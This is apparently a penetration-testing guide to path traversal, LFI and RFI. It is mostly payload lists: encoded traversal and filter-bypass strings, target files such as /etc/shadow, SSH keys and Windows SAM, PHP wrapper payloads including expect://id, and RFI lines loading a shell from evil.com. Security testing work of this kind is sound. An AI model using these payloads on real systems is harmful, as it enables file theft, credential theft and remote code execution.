# Path Traversal (LFI/RFI) Testing Guide

> Path traversal vulnerabilities allow attackers to access files outside the intended directory. This can lead to sensitive file disclosure, configuration leaks, and in some cases remote code execution.

## Scope

- File download/view functionality
- Template inclusion
- Image/document loading
- Log file viewers
- Backup/export features

## Methodology

1. Identify file path parameters
2. Test basic traversal sequences
3. Try encoding bypasses
4. Target sensitive files
5. Test for remote file inclusion

## Basic Payloads

### Directory Traversal
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
```

### Null Byte (Legacy)
```
../../../etc/passwd%00
../../../etc/passwd%00.png
```

### Double Encoding
```
%252e%252e%252f
..%c0%af
..%ef%bc%8f
```

## Bypass Techniques

### Filter Bypass
```
....//
..../
....\/
..%252f
%2e%2e%2f
%2e%2e/
..%c0%af
..%c1%9c
```

### Path Normalization
```
/var/www/images/../../../etc/passwd
/etc/passwd/.
/etc//passwd
/etc/./passwd
```

### Absolute Path
```
/etc/passwd
file:///etc/passwd
```

### UNC Path (Windows)
```
\\server\share\file
//server/share/file
```

## Sensitive Files

### Linux
```
/etc/passwd
/etc/shadow (if readable)
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/auth.log
~/.ssh/id_rsa
~/.bash_history
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\inetpub\logs\LogFiles\
C:\Users\<user>\.ssh\id_rsa
```

### Application-Specific
```
/var/www/html/.env
/var/www/html/config/database.yml
/var/www/html/wp-config.php
../config/database.yml
../application.properties
../.git/config
```

## Local File Inclusion (LFI)

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=index.php
php://input (POST data as file)
data://text/plain,<?php phpinfo(); ?>
expect://id
```

### Log Poisoning
1. Inject code into accessible log file
2. Include the log file
3. Code executes

### Session File Inclusion
1. Set session variable with code
2. Include session file
3. Code executes

## Remote File Inclusion (RFI)

### Basic RFI
```
?file=http://evil.com/shell.txt
?file=https://evil.com/shell.txt
?file=ftp://evil.com/shell.txt
```

### Bypass Null Byte
```
?file=http://evil.com/shell.txt%00
```

**Note:** RFI requires `allow_url_include` enabled (PHP)

## Validation Requirements

1. Demonstrate access to file outside intended directory
2. Show the traversal technique used
3. Retrieve sensitive file content
4. Document the impact

## False Positives

- Input sanitization removing traversal sequences
- Chroot or containerization limiting access
- Proper path canonicalization
- Allowlist of accessible files

## Impact

- Sensitive configuration disclosure
- Credential theft
- Source code disclosure
- Remote code execution (via log poisoning, etc.)
- Full system compromise

## Pro Tips

1. Test multiple traversal depths
2. Try OS-specific paths (Linux vs Windows)
3. Check for file type restrictions
4. Test encoding variations
5. Look for PHP wrappers if PHP backend
6. Test upload + include chains
7. Check error messages for path hints
8. Test both GET and POST parameters
